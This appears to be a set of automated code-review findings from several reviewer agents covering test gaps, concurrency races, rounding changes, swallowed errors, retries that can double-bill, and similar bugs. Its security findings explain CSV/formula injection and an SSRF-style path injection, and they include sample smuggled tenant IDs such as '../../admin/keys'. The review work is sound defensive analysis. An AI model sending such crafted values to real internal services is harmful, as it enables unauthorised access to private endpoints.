test_renders_empty_invoice calls render() but never asserts on its return value or any observable effect. If render() raised no exception but produced wrong output (or even silently returned None), this test would still pass. Add an assertion on the actual rendered output for a blank invoice.

_Also raised by the correctness agent:_ test_renders_empty_invoice asserts nothing

findings.title: Line-item test mocks the formatter, so output is never verified
findings.body:
`format_line` is patched out, so `render` receives `MagicMock` objects wherever formatted text should be. The only assertion is `fmt.call_count == 2`, which verifies that the renderer iterates the list — it cannot detect wrong ordering, a dropped line in assembly, wrong separators, or the total being computed from the wrong field. Either drop the mock and assert on the rendered string, or additionally assert `fmt.call_args_list` matches the expected `Line` objects in order so the test at least pins down what was passed.

_Also raised by the tests agent:_ Assertion only on mock call count, not on actual rendered output

findings.title: Failing test deleted with no accompanying implementation fix
findings.body:
The PR title says the rounding was fixed, but this change set touches only `tests/test_rounding.py` and its entire content is the removal of `test_rounds_half_to_even`. No `round_cents` implementation change appears anywhere in the diff. Either the fix is missing from this PR, or the test was removed to make CI green while the behaviour is unchanged. If the tie-breaking behaviour genuinely changed (e.g. from HALF_EVEN to HALF_UP), the test should be updated to assert the new expected value (`Decimal("2.35")`) rather than deleted — otherwise the exact-half boundary, the case most likely to regress, has no coverage at all.

_Also raised by the tests agent:_ Deleted rounding test not replaced with corrected assertion

findings.title: Patch targets notify.transport.deliver, which sender never looks up
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so `deliver` is bound into the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `send_with_retry` continues to call the original function object it captured. This test therefore runs the real transport — it will make whatever real delivery attempt `deliver` performs, and its `is False` assertion passes or fails for reasons unrelated to the retry logic it claims to cover (and gives no coverage of the three-attempt give-up path at all).

Patch `notify.sender.deliver` instead, exactly as the existing test on line 2 does, and consider asserting the call count to actually pin the `attempts=3` behaviour.

_Also raised by the tests agent:_ Test patches notify.transport.deliver, which sender.py never calls

findings.title: csv_rows never applies csv_escape, producing malformed CSV
findings.body:
`csv_rows` joins stringified field values with `,` and does no quoting, while `csv_escape` — added in the same change and clearly intended for exactly this — is not called from anywhere in the module. A row like `{"a": "Smith, John"}` renders as `Smith, John`, which parses back as two fields, silently corrupting every downstream consumer. Fields containing `"` or a newline are broken the same way.

Fix by escaping inside the comprehension, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note the `str(...)` must stay outside `csv_escape`: `csv_escape` tests `"," in value`, which raises `TypeError` on an int or None, so it is only safe on already-stringified input.

findings.title: New csv_rows/csv_escape logic has no test, unlike csv_header (and 2 more)
findings.body:
csv_header is the one function in the repo with a test. The new csv_rows and csv_escape functions introduce real logic (column ordering, missing-key defaults, comma/quote escaping) but ship with no test, so a bug in escaping or ordering would go undetected even though the existing convention is to test this module's functions.

The same gap appears at 2 other place(s) in this change:

- `reports/json_export.py:8` — New JSON export functions (dump_streaming, dump_pretty) untested
- `reports/pdf_export.py:5` — New PDF margin/width calculations untested

_Collapsed into one comment: this is one piece of work, not 3 separate ones._

findings.title: csv_rows writes field values without applying csv_escape
findings.body:
`csv_rows` joins `str(r.get(c, ""))` directly with commas and never calls the `csv_escape` helper added immediately below it. Any field value containing a comma, a double quote, or a newline will split or terminate the record, letting whoever supplies the row data control the column layout — and subsequently the contents of downstream columns — of the generated report. The same unescaped path also carries leading `=`, `+`, `-`, `@` characters straight into a file that spreadsheet software interprets as a formula (CSV/formula injection) when a recipient opens the export.

Suggested fix: call `csv_escape` inside the comprehension (`",".join(csv_escape(str(r.get(c, ""))) for c in columns)`), extend `csv_escape` to also quote values containing `\n` or `\r`, and consider prefixing values that begin with `= + - @` with a single quote or tab. Using the stdlib `csv` module would handle the quoting rules correctly for free.

Adversary: whoever supplies the record fields that end up in a report (e.g. a user-entered name or note); what they control: the string content of a cell; what they get: the ability to forge extra columns/rows in the exported report, and a formula that executes for the person who opens it. I could not see the entry point for `rows` in this change or in the retrieved context, so the reachability of untrusted data is an assumption.

findings.title: usable_width duplicates margin math instead of using margins_for
findings.body: `usable_width` recomputes the horizontal margin as `width // 20` rather than reading it from `margins_for`. The two agree today, but they are now two independent copies of the same rule: changing the margin fraction in `margins_for` alone will make `usable_width` silently disagree, and the drawable area will no longer match the rendered margins. Deriving it (`_, right, _, left = margins_for(name); return width - left - right`) keeps the single source of truth.

findings.title: Midnight rollover makes test_token_issued_today_is_valid flaky
findings.body:
`issue_token()` captures a timestamp at one instant and `datetime.now(timezone.utc)` on line 11 captures another. If the two straddle 00:00 UTC, the two `.date()` values differ and the assertion fails for reasons unrelated to the code under test. The same wall-clock dependence applies to line 12, where the token's real expiry is compared against the ambient clock.

Pin the clock instead of reading it twice: capture `now = datetime.now(timezone.utc)` once and inject it (`issue_token(now=now)` / `is_expired(token.expires_at, now=now)`), or freeze time with a fixture, mirroring the explicit-`now` style already used on line 6.

_Also raised by the tests agent:_ Time-dependent test uses real clock, can flake at day boundary

findings.title: is_expired called without `now`, relying on an unverified default
findings.body: Every other call site in this file passes `now=` explicitly (line 6). Line 12 omits it, so the test depends on `is_expired` declaring a default for `now`. If the parameter is required, this test raises `TypeError` rather than testing anything; if the default exists it silently reintroduces a wall-clock dependency. Pass `now=` explicitly to match the established call style and keep the assertion deterministic.

findings.title: Expired-coupon rejection path is untested
findings.body: The new logic that raises CouponExpired when coupon.expires_at is in the past has no corresponding test. The only test updated (test_apply_coupon_reduces_total) uses a coupon that expires tomorrow, so it never exercises the rejection branch. If the comparison were inverted, the exception were never raised, or the exception type/message were wrong, no test would fail.

findings.title: expires_at of None/missing breaks apply_coupon for existing coupons
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` is evaluated unconditionally. If a coupon has no expiry (`expires_at is None`) the comparison raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime'`; if the attribute does not exist on older coupon objects it raises `AttributeError`. Either way a perpetual coupon that used to apply cleanly now blows up with an unrelated exception rather than being accepted. The test diff — which had to add `expires_at=tomorrow()` to an existing construction — is direct evidence that callers previously built coupons without this field. Guard the check, e.g. `if coupon.expires_at is not None and coupon.expires_at < now: raise CouponExpired(...)`, and confirm every production code path that constructs a Coupon now sets the field.

findings.title: Blocking requests.get inside async def stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def`, so callers will `await` it from the event loop, but its body calls `requests.get(...)`, a synchronous socket call. While it is in flight the event loop thread cannot run any other coroutine — with `timeout=5` a slow or unreachable `billing.internal` freezes all concurrent request handling for up to five seconds per call, and DNS resolution is not covered by that timeout at all. The coroutine also never yields, so nothing else in the loop gets a chance to progress.

The module already has the right pattern directly above: `fetch_plan` takes an `httpx.AsyncClient` and awaits `client.get`. Mirror it, e.g. `async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id): response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)`, and drop the new `import requests`. If an async client cannot be threaded through here, wrap the sync call in `asyncio.to_thread(...)` so the loop stays free.

findings.title: New async function using blocking I/O has no test coverage
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests.get` call, which will block the event loop. No test exercises this function, so nothing would catch either a behavioral regression (wrong URL, wrong tenant_id interpolation, error handling) or verify the blocking-call concern is addressed (e.g. via run_in_executor). Since this is the stated purpose of the PR (fetch plan during request handling), it should have at least a test mocking the HTTP call and asserting the returned data / timeout behavior.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds `https://billing.internal/limits/{tenant_id}` by f-string with no URL-encoding and no validation that `tenant_id` matches an expected shape (UUID/int). If `tenant_id` originates from a request path, query or JSON body, a caller who controls it can inject `/`, `..`, `?` or `#` and redirect the call to a different resource on `billing.internal` — e.g. `tenant_id="../../admin/keys"` or `tenant_id="123?admin=1"` — a service that is presumably reachable only from this backend, so this is a server-side request forgery style pivot against an internal endpoint whose response is returned to the caller via `response.json()`.

Fix: validate `tenant_id` against the expected format before use, or pass it through `urllib.parse.quote(str(tenant_id), safe="")`. Passing it as a parameter rather than a path segment where possible is also fine.

Adversary: any client that can reach the handler calling this function and influence the tenant identifier. What they control: the path suffix of a request to an internal-only host. What they get: read access to other `billing.internal` endpoints, with the JSON body echoed back.

findings.title: Bare `except:` swallows KeyboardInterrupt and SystemExit
findings.body:
`except:` with no exception class catches `BaseException`, which includes `KeyboardInterrupt`, `SystemExit` and `GeneratorExit`. If `_client.send` is interrupted by Ctrl-C or during interpreter shutdown, this handler silently converts that into a normal `return None`, so shutdown/cancellation signals are absorbed by a telemetry call. Narrow it to `except Exception:` (and, if this runs under asyncio, consider also re-raising `asyncio.CancelledError`, which on Python 3.8+ derives from `BaseException` and would likewise be swallowed).

_Also raised by the security agent:_ Bare except silently discards push failures; no log despite PR description

findings.title: No test verifies push_metrics swallows exceptions and returns None
findings.body: The change alters push_metrics to catch all exceptions and return None instead of propagating failures. There is no test in this PR exercising the failure path (e.g. _client.send raising an exception) to confirm it is caught and None is returned, nor a test confirming the success path still returns the client's result. As written, a future edit that removes the try/except, changes the return value, or narrows/breaks the except clause would not be caught by any existing test.

findings.title: try_consume reads and writes _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, then hits an explicit suspension point (`await asyncio.sleep(0)`, line 18) before writing `_counters[tenant] = current + cost` on line 19 \u2014 all outside `_lock`. Two consequences on a single event loop, no threads required:

1. Limit bypass: N coroutines can each read the same `current`, each pass the `current + cost > LIMIT` check, and each write. The final counter is `current + cost` (not `current + N*cost`), so the tenant is charged once while N requests are admitted \u2014 the rate limit this function exists to enforce is effectively off under concurrency.
2. Lost updates against `consume`: `consume` (line 8) mutates the same dict under `_lock`, but `try_consume` does not take the lock, so its stale-read-then-blind-write silently discards any increment `consume` applied while `try_consume` was suspended.

Fix by doing the whole read-check-write inside the lock, e.g. `async with _lock:` wrapping lines 15\u201320, and drop the `await asyncio.sleep(0)` (or move it outside the critical section) so no suspension point sits between the check and the act.

_Also raised by the security agent:_ try_consume bypasses the lock: rate limit defeatable by concurrency

findings.title: try_consume race condition has no test to catch it
findings.body: try_consume reads _counters, awaits asyncio.sleep(0) (a suspension point), then writes _counters, all outside of _lock. Under concurrent calls this allows the limit to be exceeded — the exact race the function's own name and PR description ('so a noisy client cannot starve everyone else') is meant to prevent. No test file is included in this diff, so a concurrent-call test that would expose this race (e.g. firing multiple try_consume calls concurrently near the LIMIT boundary and asserting the total consumed never exceeds LIMIT) does not exist. Nothing in the current codebase would fail if this race were reintroduced or worsened.

findings.title: Public function `try_consume` lacks API contract documentation
findings.body:
The new function `try_consume` is a public async function that implements rate-limit checking with a specific contract: it returns False if the limit would be exceeded, True otherwise. A caller needs to know:

1. What happens to the counter when False is returned (it is not updated)
2. The semantics of the `cost` parameter and `LIMIT` constant
3. Why `await asyncio.sleep(0)` is called (if intentional; if accidental, that is a separate bug)
4. Whether this function is safe to call concurrently (it appears not to be, given the race window between the check on line 16 and the update on line 19)

Add a docstring explaining the function's behaviour and any concurrency limitations.

findings.title: Docstring describes old return type, not new dict
findings.body:
The docstring states the function returns `(name, email)` as a tuple, but the implementation now returns a dict with keys `name`, `email`, and `tier`. This is a breaking change to the public API contract. Existing callers like `reports/weekly.py` that unpack the return value as a tuple will fail at runtime. The docstring must be updated to reflect the new return shape: `{"name": str, "email": str, "tier": str}` or equivalent.

_Also raised by the correctness agent:_ Docstring still documents the old (name, email) tuple return

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body:
`lookup_user` previously returned a 2-tuple `(name, email)`. It now returns a dict with three keys. The existing caller `render_row` in `reports/weekly.py` does `name, email = lookup_user(user_id)`; unpacking a dict iterates its keys, and with three keys this raises `ValueError: too many values to unpack (expected 2)` on every call \u2014 not a silent wrong value but a hard failure at runtime.

Either update all callers in the same change (`name, email = u["name"], u["email"]`), or introduce the richer shape under a new function / `NamedTuple` that still supports positional unpacking so existing callers keep working.

findings.title: No test would catch the tuple→dict contract break for lookup_user
findings.body: lookup_user now returns a dict ({'name':..., 'email':..., 'tier':...}) instead of the (name, email) tuple it has always returned. The existing caller render_row in reports/weekly.py does `name, email = lookup_user(user_id)`, which will raise a ValueError (dict unpacks by keys, not values, and there are 3 keys not 2) as soon as it runs. There is no test in this diff exercising lookup_user's return value or render_row's behavior, so this regression would ship undetected.

findings.title: WriteSettlement always returns nil, silently dropping insert failures
findings.body:
The error from `db.Exec` is bound to a scoped `err` inside the `if` statement on line 15, logged, and then discarded. Lines 18-19 declare a fresh `var err error` that is never assigned, so the function returns `nil` on every path after validation — including when the settlement row was never written.

Any caller doing `if err := WriteSettlement(db, s); err != nil { ... }` will treat a failed insert as a success, which for a settlement writer means silent financial data loss with no retry or reconciliation signal. This also diverges from `WriteEntry` directly above (line 7-8), which propagates the `Exec` error.

If the intent really is "log and continue", that decision belongs in the batch loop that calls this function, not hidden inside the single-row writer. Otherwise return the error:

    if _, err := db.Exec(...); err != nil {
        log.Printf("settlement insert failed: %v", err)
        return err
    }
    return nil

_Also raised by the docs agent:_ WriteSettlement silently swallows errors despite claiming to return them

findings.title: WriteSettlement's always-nil return path is untested
findings.body: WriteSettlement shadows the insert error into a log line and then returns a separately-declared `err` that is never assigned, so the function always returns nil regardless of whether the insert succeeded. There is no test in this diff exercising WriteSettlement, so nothing would catch a regression where the swallowed error should have propagated, or verify the intended 'log and continue' semantics actually produce a non-nil error when appropriate (or confirm the log line fires).

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that omits the argument shares the same list object. Line 10 appends into that shared list, and line 11 returns it, so the second call returns the failures from the first call plus its own — and the list grows without bound for the process lifetime. Callers that treat the return value as "recipients that failed in this batch" will re-handle stale recipients.

Use `def send_with_retries(recipients, attempted=None):` and `attempted = [] if attempted is None else attempted` at the top of the body.

_Also raised by the security agent:_ Shared mutable default leaks recipients between callers

findings.title: No test covers send_with_retries' mutable default argument bug
findings.body: send_with_retries(recipients, attempted=[]) uses a mutable default list, which will accumulate entries across repeated calls without an explicit `attempted` argument. Nothing in the diff adds a test that calls this function twice and checks that the second call's result isn't polluted by the first. Such a test would currently fail given the bug, but no test exists to catch it — the function could be called multiple times in production and silently return stale/accumulated data with no test suite noticing.

findings.title: Rounding boundary changed from >= 0.5 to > 0.5 in a rename-only PR
findings.body:
The old implementation was `return 1 if line.remainder_cents >= 0.5 else 0`; the new one uses `> 0.5`. A remainder of exactly 0.5 — the single most common tie case in half-up money rounding — now yields 0 instead of 1, so affected line items are short by one cent. Every other function in this diff is an unmodified rename, and the PR description says the change is a rename for consistency, so this looks unintentional. Restore `>=` (or, if the half-down behaviour is deliberate, split it into its own PR with a test pinning the 0.5 boundary).

_Also raised by the tests agent:_ Rounding boundary changed from >= to > with no test coverage

findings.title: Off-by-one in page_of_sorted drops one record per page
findings.body:
The slice end is `start + PAGE_SIZE - 1`, which yields only `PAGE_SIZE - 1` items per page. Because `start` still advances by the full `PAGE_SIZE` (line 11), the record at index `start + PAGE_SIZE - 1` is never returned on this page and never on the next one either — each page silently omits one record, so a full pagination walk loses roughly 1/PAGE_SIZE of the export. Change the slice to `ordered[start : start + PAGE_SIZE]` to match `page_of` on line 6.

_Also raised by the docs agent:_ page_of_sorted slices one fewer item than page_of

findings.title: New page_of_sorted function lacks any test coverage
findings.body: page_of_sorted is a new function with its own slicing logic (start:start+PAGE_SIZE-1), differing from the existing page_of (start:start+PAGE_SIZE). No test file is included in this diff, so nothing exercises this function to catch the off-by-one slice bound (each page will drop the last record). Add a test that checks page_of_sorted returns exactly PAGE_SIZE records per page and that concatenating pages reconstructs the full sorted list.

findings.title: Removed nil guard: purchase_order is genuinely optional and will crash
findings.body:
`header_lines` now calls `.upper()` on `invoice.purchase_order` unconditionally. The retrieved model declares `purchase_order: "str | None"` and its docstring states it is "only set for customers on invoicing terms, which is roughly one account in twenty" — so `None` is the common case, not an edge case. Every invoice without a PO will raise `AttributeError: 'NoneType' object has no attribute 'upper'` when its header is rendered.

The PR description claims the type already covers the nil case, but the annotation is `str | None`, which asserts the opposite. Restore the conditional append, e.g. build the list and only add the `PO ...` entry when `invoice.purchase_order is not None`.

Note also the secondary contract change: the function previously returned a 1- or 2-element list depending on whether a PO was present; it now always returns 2 elements. Any caller that indexes or length-checks the result is affected once the crash is fixed.

findings.title: Code now assumes nullable field is non-null; docstring says it's optional
findings.body: The code now calls `.upper()` on `invoice.purchase_order` without checking for None first (line 4). However, the Invoice model docstring explicitly states that `purchase_order` is optional: 'purchase_order is optional: only set for customers on invoicing terms, which is roughly one account in twenty.' This creates a contract violation: callers relying on the documented optionality will pass None, and the code will crash. Either the field contract needs to change (and be documented), or the null guard needs to be restored.

findings.title: Removed None-guard for purchase_order has no regression test
findings.body: header_lines now unconditionally calls invoice.purchase_order.upper(), but the model docstring states purchase_order is None for roughly one in twenty customers. This will raise AttributeError for those invoices. There is no test in this diff exercising header_lines with purchase_order=None, so nothing would catch this regression if the removed guard was actually load-bearing.

findings.title: File handle leaked on header-mismatch and exception paths
findings.body: `fh = open(path)` on line 10 is only closed on line 16, which is reached solely on the success path. The `return None` on line 14 (header mismatch — the case this function exists to detect) leaves the handle open, as does any exception raised by `next(reader)` on line 12 or `list(reader)` on line 15 (e.g. `csv.Error` on a malformed field, `UnicodeDecodeError`). Under CPython refcounting this is masked most of the time, but in a loop over many partner catalogues, or on PyPy, it will exhaust file descriptors. Use `with open(path) as fh:` wrapping the whole body, matching `read_rows` on line 5.

findings.title: read_validated has no tests, including its leaking error path
findings.body: read_validated is new and untested. In particular, when header != expected_header (line 13-14) the function returns None without closing fh, leaking the file handle. A test covering the mismatched-header path would both document intended behavior and catch this leak; none exists in this diff.

findings.title: Retry wrapped around non-idempotent charge can double-bill customers
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs *after* the gateway has already accepted the POST \u2014 a timeout, a dropped connection, a 5xx returned after the charge was recorded \u2014 will cause a second and third `/charges` request, each creating a new charge. The customer is billed up to 3x.

The gateway docstring names the fix: it supports an `Idempotency-Key` header. Generate a key once per logical charge (outside the retried call, so all attempts share it) and pass it through to `charge()`, then retrying is safe. Without that, remove the decorator from `charge_card` and let the caller decide how to recover, or retry only on errors that are provably pre-submission (e.g. connection-refused / DNS failure) rather than on any exception.

Note that `fetch_charge` on lines 5-7 is fine \u2014 `get_charge` is documented as safe to repeat \u2014 so the problem is specific to the charge path added here.

_Also raised by the security agent:_ Retry wraps non-idempotent charge(); no Idempotency-Key passed

findings.title: Retry wrapper on non-idempotent charge lacks safety documentation
findings.body: The `charge_card()` function wraps `billing.gateway.charge()`, which is explicitly documented as "NOT idempotent: each call creates a new charge." Retrying without an Idempotency-Key header will create multiple charges on transient failures. The function needs a docstring warning that callers must pass an Idempotency-Key header, or the implementation must be fixed to include one.

findings.title: No test guards retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge, which the gateway docstring explicitly states is NOT idempotent and creates a new charge on every call. Retrying it on transient failure risks double-charging a customer. There is no test in this diff (or referenced) that exercises retry behavior for charge_card and asserts only one charge is created, or that an Idempotency-Key is passed through. If this logic is wrong (e.g., a retry occurs after a timeout where the first charge actually succeeded), nothing here would fail — the bug would only surface in production as duplicate charges.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body:
`datetime.now()` returns a naive local-time datetime, but `Invite.expires_at` is documented as always timezone-aware UTC. Python raises `TypeError: can't subtract offset-naive and offset-aware datetimes` for `invite.expires_at - cutoff`, so `expires_within` fails for every input rather than for an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does; the `.replace(microsecond=0)` truncation is harmless but also unnecessary. Even if the types matched, naive local `now()` would be off by the host's UTC offset, silently shifting the window.

_Also raised by the docs agent:_ Timezone-naive datetime compared to timezone-aware field

findings.title: New expires_within function has no test coverage
findings.body: expires_within is a new function that mixes datetime.now() (naive) with invite.expires_at (tz-aware, per models/invite.py docstring), which will raise TypeError when subtracted. No test exercises this function, so this defect would ship undetected.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding." `contactEmail` accesses `.email` directly on it, so for any pre-onboarding account this throws `TypeError: Cannot read properties of undefined (reading 'email')`. The sibling function `bannerFor` on line 4 already handles this correctly with `?.` plus a `??` default, which is direct evidence that the absent case is reachable on this page. Fix by mirroring that pattern, e.g. `return account.billingContact?.email.toLowerCase() ?? ""`, or change the return type to `string | undefined`, or narrow the parameter to a type where `billingContact` is required. Note that the PR description's claim that "the account payload is always present" addresses the `Account` object itself, not the optional `billingContact` field — those are different nullability questions.

_Also raised by the docs agent:_ Public function crashes on optional field without documentation

findings.title: New contactEmail function is untested and can throw on missing billingContact
findings.body: contactEmail accesses account.billingContact.email without optional chaining, but Account.billingContact is optional (per web/src/types.ts). No test exercises this function, so a regression or a caller passing an account without a billing contact would go undetected until it throws in production.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body:
`fetch()` documents `timeout` as being in MILLISECONDS ("Callers wanting seconds must multiply"), and passes it straight through as `timeout_ms`. Passing `30` gives the partner API a 30ms budget — shared across all 3 default retries — which contradicts the PR's stated intent of a generous timeout for a slow API. The nightly sync will fail every run once the partner responds slower than 30ms.

Use `timeout=30_000` (or whatever the intended second count is, multiplied by 1000), and consider whether the default `retries=3` sharing that same budget is what you want here.

findings.title: Timeout value contradicts fetch() contract
findings.body: The `fetch()` function documents that `timeout` is in MILLISECONDS (see clients/http.py line 5). Passing `timeout=30` here supplies 30ms, likely unintentionally — the comment "Timeout set generously since their API is slow" suggests the intention was 30 seconds. Either multiply by 1000 to pass `timeout=30000`, or the documented contract of `fetch()` is now being violated without acknowledgment.

findings.title: New sync_partner_catalogue has no test covering its timeout behaviour
findings.body: sync_partner_catalogue() is added with no accompanying test. fetch()'s timeout parameter is documented as milliseconds, but the call passes timeout=30, which is almost certainly intended as 30 seconds given the PR description ('timeout set generously since their API is slow'). A 30ms timeout would cause every real call to fail, but nothing in this diff would catch that — there is no test exercising this function or asserting the timeout value passed to fetch.

findings.title: Duplicate index: invoices_tenant_created_idx already covers (tenant_id, created_at DESC)
findings.body: Migration 0007 already created `invoices_tenant_created_idx ON invoices (tenant_id, created_at DESC)` — an identical column list and sort order. The new `invoices_tenant_recent_idx` is a byte-for-byte duplicate under a different name, and because `IF NOT EXISTS` matches on index *name* rather than definition, the guard will not prevent creation. The result is a second copy of the same B-tree: extra disk, extra write amplification on every invoice insert/update, and a redundant object the planner will never prefer over the existing one. The reporting query described in the PR is already served by 0007's index. Drop this statement, or if the intent was to rename/replace, explicitly drop `invoices_tenant_created_idx` after the new one is built.

findings.title: priority=9 sends reset email to the back of the queue, not the front
findings.body:
`enqueue`'s docstring states the priority argument "runs 0 to 9 and is an ordering index, not a score: **0 is drained first and 9 is drained last.** ... A job at 9 waits behind every other job on the queue." The previous call used the default of 5; passing 9 moves password-reset mail from the middle of the queue to strictly behind everything else, including the nightly digest batch this PR was meant to jump ahead of. Users will wait longer for reset tokens than before the change, and tokens may expire before delivery. Use `priority=0` (or a low value) to drain first.
